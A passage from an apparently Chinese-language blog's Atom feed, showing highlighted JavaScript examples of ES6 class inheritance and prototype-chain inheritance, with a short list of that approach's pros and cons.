class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Parent</span> </span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name,age)&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name</span><br><span class="line">        <span class="keyword">this</span>.age = age</span><br><span class="line">    &#125;</span><br><span class="line">    showName()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Child</span> <span class="keyword">extends</span> <span class="title">Parent</span></span>&#123;</span><br><span class="line">    <span class="keyword">constructor</span>(name,age,sex)&#123;</span><br><span class="line">        <span class="keyword">super</span>(name,age)</span><br><span class="line">        <span class="keyword">this</span>.sex = sex</span><br><span class="line">    &#125;</span><br><span class="line">    showSex()&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>.sex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> parent = <span class="keyword">new</span> Parent(<span class="string">'Jack'</span>,<span class="number">30</span>)</span><br><span class="line"><span class="built_in">console</span>.log(parent.name,parent.age);</span><br><span class="line"><span class="keyword">let</span> child = <span class="keyword">new</span> Child(<span class="string">'Tom'</span>,<span class="number">12</span>,<span class="string">'男'</span>)</span><br><span class="line"><span class="built_in">console</span>.log(child.name,child.age);</span><br><span class="line">child.showName() <span class="comment">//Tom</span></span><br><span class="line">child.showSex() <span class="comment">//男</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;原型链继承&quot;&gt;&lt;a href=&quot;#原型链继承&quot; class=&quot;headerlink&quot; title=&quot;原型链继承&quot;&gt;&lt;/a&gt;原型链继承&lt;/h2&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Parent&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.name = &lt;span class=&quot;string&quot;&gt;&#39;kevin&#39;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Parent.prototype.getName = &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(&lt;span class=&quot;keyword&quot;&gt;this&lt;/span&gt;.name)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;Child&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;Child.prototype = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Parent()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; child = &lt;span class=&quot;keyword&quot;&gt;new&lt;/span&gt; Child()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;console&lt;/span&gt;.log(child.name) &lt;span class=&quot;comment&quot;&gt;//kevin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;优点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;简单，容易实现&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;缺点：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;来自父类原型对象的引用属性是所有子类实例共享的&lt;/li&gt;
&lt;li&gt;创建子类实例时，无法向父类构造函数传参&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
